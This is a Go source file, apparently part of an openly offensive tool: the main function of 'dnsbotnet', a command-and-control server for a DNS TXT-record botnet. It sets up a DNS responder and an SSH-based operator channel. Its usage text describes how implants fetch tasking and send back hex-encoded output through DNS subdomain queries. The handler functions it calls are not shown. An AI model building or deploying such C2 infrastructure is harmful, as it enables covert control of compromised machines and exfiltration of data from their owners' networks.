// dnsbotnet is the controller for a DNS TXT record-based botnet
package main

/*
 * dnsbotnet.go
 * Control a DNS-based botnet
 * By J. Stuart McMurray
 * Created 20180210
 * Last Modified 20180211
 */

import (
	"flag"
	"fmt"
	"log"
	"math"
	"net"
	"os"
	"strings"

	"github.com/miekg/dns"
)

func main() {
	var (
		domain = flag.String(
			"domain",
			"",
			"Base domain `name`",
		)
		aREC = flag.String(
			"a-rec",
			"",
			"IP `address` to serve as an A record for "+
				"the bare domain",
		)
		c2Addr = flag.String(
			"c2-addr",
			"127.0.0.1:10987",
			"C2 server listen `address`",
		)
		dnsAddr = flag.String(
			"dns-addr",
			"127.0.0.1:5353",
			"DNS service `address`",
		)
		key = flag.String(
			"key",
			"id_rsa.dnsbotnet",
			"SSH key `file`, which will be created if it "+
				"does not exist",
		)
		akFile = flag.String(
			"authorized-keys",
			"authorized_keys.dnsbotnet",
			"Name of `file` with allowed SSH keys, in OpenSSH "+
				"authorized_keys format",
		)
		ttl = flag.Uint64(
			"reply-ttl",
			7200,
			"Time-to-live in `seconds` to use for replies",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]

Listens for DNS requests for TXT records, and serves up tasking.  Logs response
requests (for later processing).  The C2 server takes two lines of input: an
implant ID (usually an IP address with dots replaced by slashes) and a
line of tasking of <= 255 bytes.

Tasking request format:
	0.counter.t.implantID.domain

Output request format:
	outputhex.counter.o.implantID.domain

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	log.SetOutput(os.Stdout)

	/* Work out domain to serve */
	if "" == *domain {
		log.Fatalf("Domain needed")
	}
	*domain = strings.ToLower(dns.Fqdn(*domain))
	if _, ok := dns.IsDomainName(*domain); !ok {
		log.Fatalf("Invalid domain %q", *domain)
	}
	DOMAIN = *domain

	/* Make sure we have a reasonable TTL */
	if math.MaxUint32 < *ttl {
		log.Fatalf("TTL must be less than %v", math.MaxUint32)
	}
	TTL = uint32(*ttl)

	/* Register DNS handlers */
	dns.HandleFunc(*domain, HandleDNS)

	/* Make A record to return for the bare domain */
	if "" != *aREC {
		AREC = &dns.A{
			Hdr: dns.RR_Header{
				Name:   DOMAIN,
				Rrtype: dns.TypeA,
				Class:  dns.ClassINET,
				Ttl:    TTL,
			},
			A: net.ParseIP(*aREC),
		}
		if nil == AREC.A {
			log.Fatalf("Invalid IP address %q", *aREC)
		}
	}

	/* Listen for C2 tasking */
	AKFILE = *akFile
	if err := StartC2(*c2Addr, *key); nil != err {
		log.Fatalf(
			"Unable to listen for C2 connections on %v: %v",
			*c2Addr,
			err,
		)
	}

	/* Start DNS service */
	log.Printf("Listening on %v for requests for %v", *dnsAddr, *domain)
	if err := dns.ListenAndServe(*dnsAddr, "udp", nil); nil != err {
		log.Fatalf("Error: %v", err)
	}
}
